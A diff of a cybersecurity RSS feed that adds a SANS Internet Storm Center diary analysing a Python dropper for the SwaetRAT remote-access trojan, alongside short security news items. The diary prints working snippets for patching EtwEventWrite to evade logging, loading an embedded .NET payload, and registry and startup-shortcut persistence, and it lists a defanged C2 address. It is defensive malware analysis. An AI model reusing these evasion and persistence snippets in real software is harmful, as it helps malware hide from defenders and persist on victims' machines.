@@ -1,5 +1,148 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Fri, 03 Jan 2025 06:59:21 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>Goodware Hash Sets</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Friday Squid Blogging: Squid on Pizza</title><link>https://www.schneier.com/blog/archives/2024/12/friday-squid-blogging-squid-on-pizza.html</link><description>&lt;p&gt;Pizza Hut in Taiwan has a history of weird pizzas, &lt;a href="https://www.atlasobscura.com/articles/pizza-hut-taiwan-weird-toppings"&gt;including&lt;/a&gt; a &amp;#8220;2022 scalloped pizza with Oreos around the edge, and deep-fried chicken and calamari studded throughout the middle.&amp;#8221;&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Fri, 03 Jan 2025 07:59:18 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>SwaetRAT Delivery Through Python</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>SwaetRAT Delivery Through Python, (Fri, Jan 3rd)</title><link>https://isc.sans.edu/diary/rss/31554</link><description>&lt;p&gt;We entered a new year, but attack scenarios have not changed (yet). I found a Python script with an interesting behavior&amp;#x5b;&lt;a href="https://www.virustotal.com/gui/file/8693e1c6995ca06b43d44e11495dc24d809579fe8c3c3896e972e2292e4c7abd/details"&gt;1&lt;/a&gt;&amp;#x5d; and a low Virustotal score (7/61). It targets Microsoft Windows hosts because it starts by loading all libraries required to call Microsoft API Calls and manipulate payloads:&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;We entered a new year, but attack scenarios have not changed (yet). I found a Python script with an interesting behavior[&lt;a href="https://www.virustotal.com/gui/file/8693e1c6995ca06b43d44e11495dc24d809579fe8c3c3896e972e2292e4c7abd/details"&gt;1&lt;/a&gt;] and a low Virustotal score (7/61). It targets&amp;nbsp;Microsoft Windows hosts because&amp;nbsp;it starts by loading all libraries required to call Microsoft API Calls and manipulate payloads:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+from System.Reflection import Assembly
+from ctypes import windll
+from ctypes import wintypes
+import ctypes&lt;/pre&gt;
+
+&lt;p&gt;I have already covered multiple Python scripts that interact with the operating system at the API level.&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;Before handling the next stage, the script performs&amp;nbsp;live patching[&lt;a href="https://isc.sans.edu/diary/Live+Patching+DLLs+with+Python/31218"&gt;2&lt;/a&gt;] of interesting API calls to cover its tracks. The first one is pretty common, &lt;code&gt;AmsiScanBuffer()&lt;/code&gt;, but it also patches &lt;code&gt;EtwEventWrite()&lt;/code&gt;[&lt;a href="https://learn.microsoft.com/en-us/windows/win32/devnotes/etweventwrite"&gt;3&lt;/a&gt;] to prevent the creation of events.&lt;/p&gt;
+
+&lt;p&gt;The code (beautified) is the same for both. The very first bytes of the API calls are overwritten to return an expected value:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+if platform.architecture()[0] == '64bit':
+    etw_patch = (ctypes.c_char * 4)(0x48, 0x33, 0xc0, 0xc3)
+if platform.architecture()[0] != '64bit':
+    etw_patch = (ctypes.c_char * 5)(0x33, 0xc0, 0xc2, 0x14, 0x00)
+pEventWrite = GetProcAddress(GetModuleHandleA(b&amp;quot;ntdll.dll&amp;quot;), b&amp;quot;EtwEventWrite&amp;quot;)
+oldprotect = wintypes.DWORD(0)
+VirtualProtect(pEventWrite, ctypes.sizeof(etw_patch), RWX, ctypes.byref(oldprotect))
+RtlMoveMemory(pEventWrite, etw_patch, ctypes.sizeof(etw_patch))
+VirtualProtect(pEventWrite, ctypes.sizeof(etw_patch), oldprotect, ctypes.byref(oldprotect))&lt;/pre&gt;
+
+&lt;p&gt;Finally, the script decodes, loads, and invokes the next stage:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+PAYLOAD_DATA = &amp;quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAA [...string is too long...]&amp;quot;
+assembly = Assembly.Load(base64.b64decode(PAYLOAD_DATA))
+instance = assembly.CreateInstance(assembly.EntryPoint.Name)
+assembly.EntryPoint.Invoke(instance,None)&lt;/pre&gt;
+
+&lt;p&gt;You will probably recognize the first bytes of the payload, we are facing a PE file[&lt;a href="https://isc.sans.edu/diary/Searching+for+Base64encoded+PE+Files/22199"&gt;4&lt;/a&gt;].&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+remnux@remnux:/MalwareZoo/20250102$ base64dump.py -n 10 stage1.py
+ID  Size    Encoded          Decoded          md5 decoded                     
+--  ----    -------          -------          -----------                     
+1:      16 GetModuleHandleA ..L...xv.vW.     1b7ad174aff72b50b2484077b9fe6e0c
+2:      16 GetModuleHandleA ..L...xv.vW.     1b7ad174aff72b50b2484077b9fe6e0c
+3:      16 GetModuleHandleA ..L...xv.vW.     1b7ad174aff72b50b2484077b9fe6e0c
+4:      16 GetModuleHandleA ..L...xv.vW.     1b7ad174aff72b50b2484077b9fe6e0c
+5:      16 GetModuleHandleA ..L...xv.vW.     1b7ad174aff72b50b2484077b9fe6e0c
+6:  179544 TVqQAAMAAAAEAAAA MZ.............. 0ce61b311f5694e8d3c22ff1729cf805
+remnux@remnux:/MalwareZoo/20250102$ base64dump.py -n 10 stage1.py -s 6 -d | file -
+/dev/stdin: PE32+ executable (GUI) x86-64 Mono/.Net assembly, for MS Windows&lt;/pre&gt;
+
+&lt;p&gt;The&amp;nbsp;executable is a .Net binary that can be easily disassembled (not obfuscated) and&amp;nbsp;reversed.&lt;/p&gt;
+
+&lt;p&gt;First, it copies itself to &amp;quot;&lt;code&gt;%LOCALAPPDATA%\Microsoft\_OneDrive.exe&lt;/code&gt;&amp;quot; and checks if it is executed from this directory. This is a nice trick because many sandboxes execute samples always from the same directory eg. C:\Temp.&lt;/p&gt;
+
+&lt;p&gt;If so, it will extract the next stage. It also creates the directory &amp;quot;&lt;code&gt;%LOCALAPPDATA%\Xbox&lt;/code&gt;&amp;quot;. Persistence is implemented via a registry key and a link file in the Startup folder:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+public static void __PER_v4_() {
+    string text = &amp;quot;Software\\STD&amp;quot;;
+    string text2 = &amp;quot;DDD&amp;quot;;
+    try {
+        RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(text);
+        registryKey.SetValue(text2, &amp;quot;\&amp;quot;&amp;quot; + Process.GetCurrentProcess().MainModule.FileName.ToString() + &amp;quot;\&amp;quot;&amp;quot;);
+        registryKey.Close();
+    }
+    catch (Exception) { }
+    try {
+        WshShell wshShell = (WshShell)Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid(&amp;quot;72C24DD5-D70A-438B-8A42-98424B88AFB8&amp;quot;)));
+        if (Program.&amp;lt;&amp;gt;o__0.&amp;lt;&amp;gt;p__0 == null) {
+            Program.&amp;lt;&amp;gt;o__0.&amp;lt;&amp;gt;p__0 = CallSite&amp;lt;Func&amp;lt;CallSite, object, IWshShortcut&amp;gt;&amp;gt;.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(IWshShortcut), typeof(Program)));
+        }
+        IWshShortcut wshShortcut = Program.&amp;lt;&amp;gt;o__0.&amp;lt;&amp;gt;p__0.Target(Program.&amp;lt;&amp;gt;o__0.&amp;lt;&amp;gt;p__0,     
+wshShell.CreateShortcut(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + &amp;quot;\\Winexe.lnk&amp;quot;));
+        wshShortcut.TargetPath = &amp;quot;powershell.exe&amp;quot;;
+        wshShortcut.Arguments = &amp;quot;Start-Process -FilePath (Get-ItemProperty 'HKCU:&amp;quot; + text + &amp;quot;').&amp;quot; + text2;
+        wshShortcut.WindowStyle = 7;
+        wshShortcut.Save();
+    }
+    catch (Exception) { }
+}&lt;/pre&gt;
+
+&lt;p&gt;Finally, the next payload is decoded:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+new WebClient();
+string hex = &amp;quot;4D5A90000300000004000000FFFF0000B8000000[...string is too long...]&amp;quot;;
+try {
+    Thread.Sleep(1500);
+}
+catch { }
+try {
+    Program.Run(&amp;quot;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\aspnet_compiler.exe&amp;quot;, Program.BA(hex), false);&lt;/pre&gt;
+
+&lt;p&gt;The hex variable is decoded using the &lt;code&gt;BA()&lt;/code&gt; function:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+public static byte[] BA(string hex) {
+    int length = hex.Length;
+    byte[] array = new byte[length / 2];
+    for (int i = 0; i &amp;lt; length; i += 2) {
+        array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
+    }
+    return array;
+}&lt;/pre&gt;
+
+&lt;p&gt;The next stage (SHA256: f8ff16829e8fe1d06126c42c76b2bf48c62a02d1c6426e448e723168ecdf19fc)&amp;nbsp;is the SwaetRAT itself. Another .Net binary, non-obfuscated, you can see the RAT capabilities directly during the disassembly:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/isc-20250103-1.png" style="width: 300px; height: 270px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;The malware copies itself in another location: &amp;quot;&lt;code&gt;%APPDATA%\CCleaner.exe&lt;/code&gt;&amp;quot;. The configuration can be easily extracted:&lt;/p&gt;
+
+&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/isc-20250103-2.png" style="width: 1250px; height: 279px;" /&gt;&lt;/p&gt;
+
+&lt;p&gt;It's always interesting to perform some threat intelligence and I found interesting relations to this RAT:&lt;/p&gt;
+
+&lt;ul&gt;
+	&lt;li&gt;The sample (f8ff16829e8fe1d06126c42c76b2bf48c62a02d1c6426e448e723168ecdf19fc) has been identified in another campaign[&lt;a href="https://isc.sans.edu/diary/ExelaStealer+Delivered+From+Russia+With+Love/31118"&gt;5&lt;/a&gt;]&lt;/li&gt;
+	&lt;li&gt;The sample has been covered by eSentire[&lt;a href="https://www.esentire.com/blog/phantomcontrol-returns-with-ande-loader-and-swaetrat"&gt;6&lt;/a&gt;]&amp;nbsp;in 2023&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The RAT C2 server can be extracted from the payload:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+{
+    &amp;quot;c2&amp;quot;: [
+        &amp;quot;144[.]126[.]149[.]221:7777&amp;quot;
+    ],
+    &amp;quot;rule&amp;quot;: &amp;quot;Swaetrat&amp;quot;,
+    &amp;quot;family&amp;quot;: &amp;quot;swaetrat&amp;quot;
+}
+&lt;/pre&gt;
+
+&lt;p&gt;[1]&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/8693e1c6995ca06b43d44e11495dc24d809579fe8c3c3896e972e2292e4c7abd/details"&gt;https://www.virustotal.com/gui/file/8693e1c6995ca06b43d44e11495dc24d809579fe8c3c3896e972e2292e4c7abd/details&lt;/a&gt;&lt;br /&gt;
+[2] &lt;a href="https://isc.sans.edu/diary/Live+Patching+DLLs+with+Python/31218"&gt;https://isc.sans.edu/diary/Live+Patching+DLLs+with+Python/31218&lt;/a&gt;&lt;br /&gt;
+[3] &lt;a href="https://learn.microsoft.com/en-us/windows/win32/devnotes/etweventwrite"&gt;https://learn.microsoft.com/en-us/windows/win32/devnotes/etweventwrite&lt;/a&gt;&lt;br /&gt;
+[4] &lt;a href="https://isc.sans.edu/diary/Searching+for+Base64encoded+PE+Files/22199"&gt;https://isc.sans.edu/diary/Searching+for+Base64encoded+PE+Files/22199&lt;/a&gt;&lt;br /&gt;
+[5]&amp;nbsp;&lt;a href="https://isc.sans.edu/diary/ExelaStealer+Delivered+From+Russia+With+Love/31118"&gt;https://isc.sans.edu/diary/ExelaStealer+Delivered+From+Russia+With+Love/31118&lt;/a&gt;&lt;br /&gt;
+[6]&amp;nbsp;&lt;a href="https://www.esentire.com/blog/phantomcontrol-returns-with-ande-loader-and-swaetrat"&gt;https://www.esentire.com/blog/phantomcontrol-returns-with-ande-loader-and-swaetrat&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Xavier Mertens (@xme)&lt;br /&gt;
+Xameco&lt;br /&gt;
+Senior ISC Handler - Freelance Cyber Security Consultant&lt;br /&gt;
+&lt;a href="https://keybase.io/xme/key.asc"&gt;PGP Key&lt;/a&gt;&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31554</guid></item><item><title>Friday Squid Blogging: Squid on Pizza</title><link>https://www.schneier.com/blog/archives/2024/12/friday-squid-blogging-squid-on-pizza.html</link><description>&lt;p&gt;Pizza Hut in Taiwan has a history of weird pizzas, &lt;a href="https://www.atlasobscura.com/articles/pizza-hut-taiwan-weird-toppings"&gt;including&lt;/a&gt; a &amp;#8220;2022 scalloped pizza with Oreos around the edge, and deep-fried chicken and calamari studded throughout the middle.&amp;#8221;&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.schneier.com/blog/archives/2024/06/new-blog-moderation-policy.html"&gt;Blog moderation policy.&lt;/a&gt;&lt;/p&gt;</description><content:encoded>&lt;p&gt;Pizza Hut in Taiwan has a history of weird pizzas, &lt;a href="https://www.atlasobscura.com/articles/pizza-hut-taiwan-weird-toppings"&gt;including&lt;/a&gt; a &amp;#8220;2022 scalloped pizza with Oreos around the edge, and deep-fried chicken and calamari studded throughout the middle.&amp;#8221;&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.schneier.com/blog/archives/2024/06/new-blog-moderation-policy.html"&gt;Blog moderation policy.&lt;/a&gt;&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=69720</guid><category>Uncategorized</category><category>squid</category></item><item><title>Google Is Allowing Device Fingerprinting</title><link>https://www.schneier.com/blog/archives/2025/01/google-is-allowing-device-fingerprinting.html</link><description>&lt;p&gt;Lukasz Olejnik &lt;a href="https://blog.lukaszolejnik.com/biggest-privacy-erosion-in-10-years-on-googles-policy-change-towards-fingerprinting/"&gt;writes&lt;/a&gt; about device fingerprinting, and why Google&amp;#8217;s policy change to allow it in 2025 is a major privacy setback.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Lukasz Olejnik &lt;a href="https://blog.lukaszolejnik.com/biggest-privacy-erosion-in-10-years-on-googles-policy-change-towards-fingerprinting/"&gt;writes&lt;/a&gt; about device fingerprinting, and why Google&amp;#8217;s policy change to allow it in 2025 is a major privacy setback.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://www.schneier.com/?p=69728</guid><category>Uncategorized</category><category>data collection</category><category>fingerprints</category><category>Google</category><category>identification</category><category>privacy</category><category>tracking</category></item><item><title>IBM’s Acquisition of HashiCorp Investigated by UK Competition Authority</title><link>https://www.techrepublic.com/article/ibm-hashicorp-merger-investigated-uk/</link><description>HashiCorp provides hybrid and multi-cloud lifecycle management products that could assist IBM’s customers with their AI ambitions.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4283329</guid><category>Artificial Intelligence</category><category>Cloud</category><category>International</category><category>Microsoft</category><category>Software</category><category>United Kingdom</category><category>cloud</category><category>competition and markets authority</category><category>hashicorp</category><category>ibm</category><category>legislation</category><category>mergers and acquisitions</category><category>regulation</category><category>uk</category></item><item><title>Goodware Hash Sets, (Thu, Jan 2nd)</title><link>https://isc.sans.edu/diary/rss/31556</link><description>&lt;p&gt;In the cybersecurity landscape, we all need hashes&amp;#x21; A hash is the result of applying a special mathematical function (a &amp;#xe2;&amp;#x20ac;&amp;#x153;hash function&amp;#xe2;&amp;#x20ac;&amp;#x9d;) that transforms an input (such as a file or a piece of text) into a fixed-size string or number. This output, often called a &amp;#xe2;&amp;#x20ac;&amp;#x153;hash value,&amp;#xe2;&amp;#x20ac;&amp;#x9d; &amp;#xe2;&amp;#x20ac;&amp;#x153;digest,&amp;#xe2;&amp;#x20ac;&amp;#x9d; or &amp;#xe2;&amp;#x20ac;&amp;#x153;checksum,&amp;#xe2;&amp;#x20ac;&amp;#x9d; uniquely represents the original data. In the context of this diary, hashes are commonly used for data integrity checks. There are plenty of them (MD5, SHA-1, SHA-2, SHA-256, &amp;#xe2;&amp;#x20ac;&amp;#xa6;), SHA256 being the most popular for a while because older like MD5 are considered as broken because researchers have demonstrated practical collision attacks.&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;In the cybersecurity landscape, we all need hashes! A hash is the result of applying a special mathematical function (a &amp;ldquo;hash function&amp;rdquo;) that transforms an input (such as a file or a piece of text) into a fixed-size string or number. This output, often called a &amp;ldquo;hash value,&amp;rdquo; &amp;ldquo;digest,&amp;rdquo; or &amp;ldquo;checksum,&amp;rdquo; uniquely represents the original data. In the context of this diary, hashes are commonly used for data integrity checks. There are plenty of them (MD5, SHA-1, SHA-2, SHA-256, &amp;hellip;), SHA256 being the most popular for a while because older like MD5 are considered as broken because researchers have demonstrated practical collision attacks.&lt;/p&gt;
 
@@ -811,7 +954,7 @@ Senior ISC Handler - Freelance Cyber Security Consultant&lt;br /&gt;
 &lt;a href="https://keybase.io/xme/key.asc"&gt;PGP Key&lt;/a&gt;&lt;/p&gt;
 
  
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31538</guid></item><item><title>ISC Stormcast For Friday, December 20th, 2024 https://isc.sans.edu/podcastdetail/9264, (Fri, Dec 20th)</title><link>https://isc.sans.edu/diary/rss/31536</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31536</guid></item><item><title>EU Provides Guidance on How AI Developers Can Obey Privacy Laws</title><link>https://www.techrepublic.com/article/eu-guidance-ai-privacy-laws/</link><description>The opinion addresses how AI companies can be exempt from GDPR, when they can process personal data without the individuals’ consent, and the consequences of developing a model with unlawfully processed data.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4281574</guid><category>Artificial Intelligence</category><category>EU</category><category>International</category><category>ai</category><category>artificial intelligence</category><category>digital markets act</category><category>emea</category><category>eu</category><category>europe</category><category>gdpr</category><category>generative ai</category><category>legislation</category><category>privacy</category><category>regulation</category></item><item><title>Rounding Up 2024’s Biggest Tech Fails: What Went Wrong This Year?</title><link>https://www.techrepublic.com/article/top-tech-fails-2024/</link><description>Explore the biggest tech failures of 2024, from product flops to security breaches, and uncover the lessons that rocked the industry this year.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4281561</guid><category>Artificial Intelligence</category><category>Cloud</category><category>Google</category><category>Hardware</category><category>Innovation</category><category>International</category><category>Microsoft</category><category>Software</category><category>United Kingdom</category><category>crowdstrike</category><category>google ai overviews</category><category>google gemini</category><category>google search</category><category>humane ai pin</category><category>intel</category><category>microsoft recall</category><category>rabbit r1</category><category>tesla</category></item><item><title>Securing Cloud Environments Against Potential Extortion Threats</title><link>https://blog.qualys.com/category/vulnerabilities-threat-research</link><description>Introduction With the growing reliance on cloud infrastructure, organizations must be vigilant against potential extortion threats targeting misconfigurations and weak access controls. Unfortunately, extortion threats are a huge problem. According to the Verizon 2024 Data Breach Investigations Report (DBIR), “Roughly one-third of all breaches involved Ransomware or some other Extortion technique.” Hypothetically, an attack could leverage exposed [&amp;#8230;]</description><content:encoded>&lt;h2 class="wp-block-heading" id="introduction"&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h2&gt;
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31538</guid></item><item><title>EU Provides Guidance on How AI Developers Can Obey Privacy Laws</title><link>https://www.techrepublic.com/article/eu-guidance-ai-privacy-laws/</link><description>The opinion addresses how AI companies can be exempt from GDPR, when they can process personal data without the individuals’ consent, and the consequences of developing a model with unlawfully processed data.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4281574</guid><category>Artificial Intelligence</category><category>EU</category><category>International</category><category>ai</category><category>artificial intelligence</category><category>digital markets act</category><category>emea</category><category>eu</category><category>europe</category><category>gdpr</category><category>generative ai</category><category>legislation</category><category>privacy</category><category>regulation</category></item><item><title>Rounding Up 2024’s Biggest Tech Fails: What Went Wrong This Year?</title><link>https://www.techrepublic.com/article/top-tech-fails-2024/</link><description>Explore the biggest tech failures of 2024, from product flops to security breaches, and uncover the lessons that rocked the industry this year.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4281561</guid><category>Artificial Intelligence</category><category>Cloud</category><category>Google</category><category>Hardware</category><category>Innovation</category><category>International</category><category>Microsoft</category><category>Software</category><category>United Kingdom</category><category>crowdstrike</category><category>google ai overviews</category><category>google gemini</category><category>google search</category><category>humane ai pin</category><category>intel</category><category>microsoft recall</category><category>rabbit r1</category><category>tesla</category></item><item><title>Securing Cloud Environments Against Potential Extortion Threats</title><link>https://blog.qualys.com/category/vulnerabilities-threat-research</link><description>Introduction With the growing reliance on cloud infrastructure, organizations must be vigilant against potential extortion threats targeting misconfigurations and weak access controls. Unfortunately, extortion threats are a huge problem. According to the Verizon 2024 Data Breach Investigations Report (DBIR), “Roughly one-third of all breaches involved Ransomware or some other Extortion technique.” Hypothetically, an attack could leverage exposed [&amp;#8230;]</description><content:encoded>&lt;h2 class="wp-block-heading" id="introduction"&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h2&gt;
 
 
 
